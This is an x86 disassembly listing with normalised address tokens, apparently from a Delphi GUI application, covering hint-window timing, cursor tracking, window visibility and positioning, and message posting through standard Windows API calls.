mov ebx eax
xor eax eax
push ebp
push sub_468e0f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4041fc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_468618
mov eax [ ebp - 0x108 ]
call sub_404624
push eax
mov eax [ ebp - 0x4 ]
call sub_404624
mov edx eax
mov eax ebx
pop ecx
call sub_468bec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468e16
lea eax [ ebp - 0x108 ]
call sub_404164
lea eax [ ebp - 0x4 ]
call sub_404164
retn
mov eax [ ebp - 0x4 ]
call sub_408868
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402e18
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402c30
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40442c
sub_468e2c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_44f950
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_44fab8
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_4694d0
test al al
je r-xdata
call sub_44f7b4
mov ebp eax
mov eax edi
call sub_44f7b4
mov ebp eax
mov eax esi
call sub_4694d0
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_468f94
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_468fec
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4694d0
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_469d1c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468ff3
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_468ffc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_469054
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_4694d0
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_469d1c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46905b
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_46906c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403368
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_449154
jmp r-xdata
sub_4690bc
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_4665f0
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_44f7b4
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4665dc
mov ebx eax
mov eax ebx
call sub_44fab8
test al al
je r-xdata
mov eax ebx
call sub_44f7b4
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_469120
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_447838
mov edi eax
call sub_446134
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_44a180
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_44a180
sub_469198
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4692a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_469120
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4671a0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4460f0
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_469358
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403830#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_4696f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4690bc
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_420a50
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4692af
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_4692b8
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_4665d4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_4665c0
movzx edx di
xor ecx ecx
call sub_44a180
inc esi
dec ebx
jne r-xdata
sub_4692f4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_468410
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_468410
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_4692b8
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_469358
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404570
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_4041b8
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_442d48
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_455a50
xor eax eax
push ebp
push j_sub_403ae4#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403368
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_4693ec
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_469448
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_4665d4
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_4693ec
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4665c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_4693ec
pop ecx
jmp r-xdata
mov eax ebx
call sub_44fab8
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_44f7b4
push eax
call IsChild
test eax eax
jne r-xdata
sub_4694d0
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405b04
call sub_42ad18
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_4694f8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_46953c
push sub_4671f8
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4696f0
sub_469564
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406e48
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_448acc
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_447838
call sub_4671d8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_4696f0
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406e48
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_448acc
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_4696f0
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_4694f8
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_44a180
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_469988
jmp r-xdata
sub_469674
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46953c
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_469988
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_4696ac
jmp r-xdata
sub_4696ac
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44fab8
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_44f7b4
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_44f7b4
push eax
call ShowWindow
sub_4696f0
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4696ac
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_467360
mov eax ebx
call sub_46953c
sub_469728
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_46986a
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_4263e8
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407fe4
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_46983b
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4264a0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469842
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_40270c
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_469718
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_469718
mov [ ebp - 0x4 ] eax
sub_469842
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_46987c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403368
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4032b0
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_4698dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_469976
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46997d
lea eax [ ebp - 0x8 ]
call sub_404164
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404254
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_424fcc
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c720
mov ebx eax
inc ebx
sub_469988
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404af0
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_469d0e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_4696f0
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4694f8
jmp r-xdata
call sub_45fb40
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469d15
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404bb4
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_447838
call sub_4671d8
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_469728
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_466554
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_448954
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_448af8
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4671a0
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_4460ac
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_4041fc
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_44a180
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_46987c
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403564
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_448acc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_448acc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_449154
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_4672ec
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_4698dc
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_4694f8
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_4694f8
jmp r-xdata
sub_469d1c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_4041b8
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_4041b8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_469d58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_44a180
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_44a180
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_455918
sub_469de8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_469e10
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_469eb4
add [ eax ] eax
add [ eax ] al
sbb al 0x2e
dec eax
add [ eax + ebx * 2 + 0x44 ] cl
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_469f17
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469f1e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
